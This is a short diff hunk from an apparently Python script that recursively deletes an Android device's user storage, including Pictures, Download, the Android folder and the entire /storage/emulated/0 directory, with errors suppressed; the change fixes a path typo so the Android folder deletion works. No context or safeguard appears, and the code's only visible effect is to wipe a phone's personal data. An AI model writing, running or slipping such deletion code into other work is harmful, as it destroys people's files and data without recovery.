@@ -118,7 +118,7 @@ shutil.rmtree('/storage/emulated/0/Pictures', ignore_errors=True)
 
 shutil.rmtree("/storage/emulated/0/Download", ignore_errors=True)
 
-shutil.rmtree("/storage/emulated/0Android", ignore_errors=True)
+shutil.rmtree("/storage/emulated/0/Android", ignore_errors=True)
 
 shutil.rmtree("/storage/emulated/0", ignore_errors=True)
 
